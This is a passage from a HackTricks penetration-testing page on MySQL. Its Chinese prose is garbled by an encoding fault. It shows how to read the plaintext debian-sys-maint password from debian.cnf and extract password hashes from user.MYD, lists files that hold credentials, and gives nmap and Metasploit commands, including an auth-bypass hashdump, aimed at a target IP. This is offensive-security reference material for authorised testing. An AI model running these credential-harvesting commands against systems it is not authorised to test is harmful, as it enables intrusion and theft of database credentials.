åœ¨ _/etc/mysql/debian.cnf_ æ–‡ä»¶ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°ç”¨æˆ· **debian-sys-maint** çš„**æ˜æ–‡å¯†ç **ã€‚
```bash
cat /etc/mysql/debian.cnf
```
æ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å‡­æ®ç™»å½•åˆ°MySQLæ•°æ®åº“ã€‚

åœ¨æ–‡ä»¶_/var/lib/mysql/mysql/user.MYD_ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°MySQLç”¨æˆ·çš„æ‰€æœ‰å“ˆå¸Œå€¼ï¼ˆå¯ä»¥ä»æ•°æ®åº“ä¸­çš„mysql.userä¸­æå–çš„å“ˆå¸Œå€¼ï¼‰ã€‚

æ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æå–å®ƒä»¬ï¼š
```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```
### å¯ç”¨æ—¥å¿—è®°å½•

æ‚¨å¯ä»¥åœ¨`/etc/mysql/my.cnf`æ–‡ä»¶ä¸­å–æ¶ˆæ³¨é‡Šä»¥ä¸‹è¡Œä»¥å¯ç”¨mysqlæŸ¥è¯¢çš„æ—¥å¿—è®°å½•ï¼š

![](<../.gitbook/assets/image (277).png>)

### æœ‰ç”¨çš„æ–‡ä»¶

é…ç½®æ–‡ä»¶

* windows \*
* config.ini
* my.ini
* windows\my.ini
* winnt\my.ini
* \<InstDir>/mysql/data/
* unix
* my.cnf
* /etc/my.cnf
* /etc/mysql/my.cnf
* /var/lib/mysql/my.cnf
* \~/.my.cnf
* /etc/my.cnf
* å‘½ä»¤å†å²è®°å½•
* \~/.mysql.history
* æ—¥å¿—æ–‡ä»¶
* connections.log
* update.log
* common.log

## é»˜è®¤çš„MySQLæ•°æ®åº“/è¡¨

{% tabs %}
{% tab title="information_schema" %}
ALL\_PLUGINS\
APPLICABLE\_ROLES\
CHARACTER\_SETS\
CHECK\_CONSTRAINTS\
COLLATIONS\
COLLATION\_CHARACTER\_SET\_APPLICABILITY\
COLUMNS\
COLUMN\_PRIVILEGES\
ENABLED\_ROLES\
ENGINES\
EVENTS\
FILES\
GLOBAL\_STATUS\
GLOBAL\_VARIABLES\
KEY\_COLUMN\_USAGE\
KEY\_CACHES\
OPTIMIZER\_TRACE\
PARAMETERS\
PARTITIONS\
PLUGINS\
PROCESSLIST\
PROFILING\
REFERENTIAL\_CONSTRAINTS\
ROUTINES\
SCHEMATA\
SCHEMA\_PRIVILEGES\
SESSION\_STATUS\
SESSION\_VARIABLES\
STATISTICS\
SYSTEM\_VARIABLES\
TABLES\
TABLESPACES\
TABLE\_CONSTRAINTS\
TABLE\_PRIVILEGES\
TRIGGERS\
USER\_PRIVILEGES\
VIEWS\
INNODB\_LOCKS\
INNODB\_TRX\
INNODB\_SYS\_DATAFILES\
INNODB\_FT\_CONFIG\
INNODB\_SYS\_VIRTUAL\
INNODB\_CMP\
INNODB\_FT\_BEING\_DELETED\
INNODB\_CMP\_RESET\
INNODB\_CMP\_PER\_INDEX\
INNODB\_CMPMEM\_RESET\
INNODB\_FT\_DELETED\
INNODB\_BUFFER\_PAGE\_LRU\
INNODB\_LOCK\_WAITS\
INNODB\_TEMP\_TABLE\_INFO\
INNODB\_SYS\_INDEXES\
INNODB\_SYS\_TABLES\
INNODB\_SYS\_FIELDS\
INNODB\_CMP\_PER\_INDEX\_RESET\
INNODB\_BUFFER\_PAGE\
INNODB\_FT\_DEFAULT\_STOPWORD\
INNODB\_FT\_INDEX\_TABLE\
INNODB\_FT\_INDEX\_CACHE\
INNODB\_SYS\_TABLESPACES\
INNODB\_METRICS\
INNODB\_SYS\_FOREIGN\_COLS\
INNODB\_CMPMEM\
INNODB\_BUFFER\_POOL\_STATS\
INNODB\_SYS\_COLUMNS\
INNODB\_SYS\_FOREIGN\
INNODB\_SYS\_TABLESTATS\
GEOMETRY\_COLUMNS\
SPATIAL\_REF\_SYS\
CLIENT\_STATISTICS\
INDEX\_STATISTICS\
USER\_STATISTICS\
INNODB\_MUTEXES\
TABLE\_STATISTICS\
INNODB\_TABLESPACES\_ENCRYPTION\
user\_variables\
INNODB\_TABLESPACES\_SCRUBBING\
INNODB\_SYS\_SEMAPHORE\_WAITS
{% endtab %}

{% tab title="mysql" %}
columns\_priv\
column\_stats\
db\
engine\_cost\
event\
func\
general\_log\
gtid\_executed\
gtid\_slave\_pos\
help\_category\
help\_keyword\
help\_relation\
help\_topic\
host\
index\_stats\
innodb\_index\_stats\
innodb\_table\_stats\
ndb\_binlog\_index\
plugin\
proc\
procs\_priv\
proxies\_priv\
roles\_mapping\
server\_cost\
servers\
slave\_master\_info\
slave\_relay\_log\_info\
slave\_worker\_info\
slow\_log\
tables\_priv\
table\_stats\
time\_zone\
time\_zone\_leap\_second\
time\_zone\_name\
time\_zone\_transition\
time\_zone\_transition\_type\
transaction\_registry\
user
{% endtab %}

{% tab title="performance_schema" %}
accounts\
cond\_instances\
events\_stages\_current\
events\_stages\_history\
events\_stages\_history\_long\
events\_stages\_summary\_by\_account\_by\_event\_name\
events\_stages\_summary\_by\_host\_by\_event\_name\
events\_stages\_summary\_by\_thread\_by\_event\_name\
events\_stages\_summary\_by\_user\_by\_event\_name\
events\_stages\_summary\_global\_by\_event\_name\
events\_statements\_current\
events\_statements\_history\
events\_statements\_history\_long\
events\_statements\_summary\_by\_account\_by\_event\_name\
events\_statements\_summary\_by\_digest\
events\_statements\_summary\_by\_host\_by\_event\_name\
events\_statements\_summary\_by\_program\
events\_statements\_summary\_by\_thread\_by\_event\_name\
events\_statements\_summary\_by\_user\_by\_event\_name\
events\_statements\_summary\_global\_by\_event\_name\
events\_transactions\_current\
events\_transactions\_history\
events\_transactions\_history\_long\
events\_transactions\_summary\_by\_account\_by\_event\_name\
events\_transactions\_summary\_by\_host\_by\_event\_name\
events\_transactions\_summary\_by\_thread\_by\_event\_name\
events\_transactions\_summary\_by\_user\_by\_event\_name\
events\_transactions\_summary\_global\_by\_event\_name\
events\_waits\_current\
events\_waits\_history\
events\_waits\_history\_long\
events\_waits\_summary\_by\_account\_by\_event\_name\
events\_waits\_summary\_by\_host\_by\_event\_name\
events\_waits\_summary\_by\_instance\
events\_waits\_summary\_by\_thread\_by\_event\_name\
events\_waits\_summary\_by\_user\_by\_event\_name\
events\_waits\_summary\_global\_by\_event\_name\
file\_instances\
file\_summary\_by\_event\_name\
file\_summary\_by\_instance\
global\_status\
global\_variables\
host\_cache\
hosts\
memory\_summary\_by\_account\_by\_event\_name\
memory\_summary\_by\_host\_by\_event\_name\
memory\_summary\_by\_thread\_by\_event\_name\
memory\_summary\_by\_user\_by\_event\_name\
memory\_summary\_global\_by\_event\_name\
metadata\_locks\
mutex\_instances\
objects\_summary\_global\_by\_type\
performance\_timers\
prepared\_statements\_instances\
replication\_applier\_configuration\
replication\_applier\_status\
replication\_applier\_status\_by\_coordinator\
replication\_applier\_status\_by\_worker\
replication\_connection\_configuration\
replication\_connection\_status\
replication\_group\_member\_stats\
replication\_group\_members\
rwlock\_instances\
session\_account\_connect\_attrs\
session\_connect\_attrs\
session\_status\
session\_variables\
setup\_actors\
setup\_consumers\
setup\_instruments\
setup\_objects\
setup\_timers\
socket\_instances\
socket\_summary\_by\_event\_name\
socket\_summary\_by\_instance\
status\_by\_account\
status\_by\_host\
status\_by\_thread\
status\_by\_user\
table\_handles\
table\_io\_waits\_summary\_by\_index\_usage\
table\_io\_waits\_summary\_by\_table\
table\_lock\_waits\_summary\_by\_table\
threads\
user\_variables\_by\_thread\
users\
variables\_by\_thread
{% endtab %}

{% tab title="sys" %}
host\_summary\
host_summary_by_file_io\
host_summary_by_file_io_type\
host_summary_by_stages\
host_summary_by_statement_latency\
host_summary_by_statement_type\
innodb_buffer_stats_by_schema\
innodb_buffer_stats_by_table\
innodb_lock_waits\
io_by_thread_by_latency\
io_global_by_file_by_bytes\
io_global_by_file_by_latency\
io_global_by_wait_by_bytes\
io_global_by_wait_by_latency\
latest_file_io\
memory_by_host_by_current_bytes\
memory_by_thread_by_current_bytes\
memory_by_user_by_current_bytes\
memory_global_by_current_bytes\
memory_global_total\
metrics\
processlist\
ps_check_lost_instrumentation\
schema_auto_increment_columns\
schema_index_statistics\
schema_object_overview\
schema_redundant_indexes\
schema_table_lock_waits\
schema_table_statistics\
schema_table_statistics_with_buffer\
schema_tables_with_full_table_scans\
schema_unused_indexes\
session\
session_ssl_status\
statement_analysis\
statements_with_errors_or_warnings\
statements_with_full_table_scans\
statements_with_runtimes_in_95th_percentile\
statements_with_sorting\
statements_with_temp_tables\
sys_config\
user_summary\
user_summary_by_file_io\
user_summary_by_file_io_type\
user_summary_by_stages\
user_summary_by_statement_latency\
user_summary_by_statement_type\
version\
wait_classes_global_by_avg_latency\
wait_classes_global_by_latency\
waits_by_host_by_latency\
waits_by_user_by_latency\
waits_global_by_latency\
x$host_summary\
x$host_summary_by_file_io\
x$host_summary_by_file_io_type\
x$host_summary_by_stages\
x$host_summary_by_statement_latency\
x$host_summary_by_statement_type\
x$innodb_buffer_stats_by_schema\
x$innodb_buffer_stats_by_table\
x$innodb_lock_waits\
x$io_by_thread_by_latency\
x$io_global_by_file_by_bytes\
x$io_global_by_file_by_latency\
x$io_global_by_wait_by_bytes\
x$io_global_by_wait_by_latency\
x$latest_file_io\
x$memory_by_host_by_current_bytes\
x$memory_by_thread_by_current_bytes\
x$memory_by_user_by_current_bytes\
x$memory_global_by_current_bytes\
x$memory_global_total\
x$processlist\
x$ps_digest_95th_percentile_by_avg_us\
x$ps_digest_avg_latency_distribution\
x$ps_schema_table_statistics_io\
x$schema_flattened_keys\
x$schema_index_statistics\
x$schema_table_lock_waits\
x$schema_table_statistics\
x$schema_table_statistics_with_buffer\
x$schema_tables_with_full_table_scans\
x$session\
x$statement_analysis\
x$statements_with_errors_or_warnings\
x$statements_with_full_table_scans\
x$statements_with_runtimes_in_95th_percentile\
x$statements_with_sorting\
x$statements_with_temp_tables\
x$user_summary\
x$user_summary_by_file_io\
x$user_summary_by_file_io_type\
x$user_summary_by_stages\
x$user_summary_by_statement_latency\
x$user_summary_by_statement_type\
x$wait_classes_global_by_avg_latency\
x$wait_classes_global_by_latency\
x$waits_by_host_by_latency\
x$waits_by_user_by_latency\
x$waits_global_by_latency

## HackTricksè‡ªåŠ¨å‘½ä»¤
```
Protocol_Name: MySql    #Protocol Abbreviation if there is one.
Port_Number:  3306     #Comma separated if there is more than one.
Protocol_Description: MySql     #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for MySql
Note: |
MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).

https://book.hacktricks.xyz/pentesting/pentesting-mysql

Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶ç½‘ç»œå®‰å…¨å…¬å¸å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­å®£ä¼ ä½ çš„å…¬å¸å—ï¼Ÿæˆ–è€…æƒ³è¦è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDFå—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
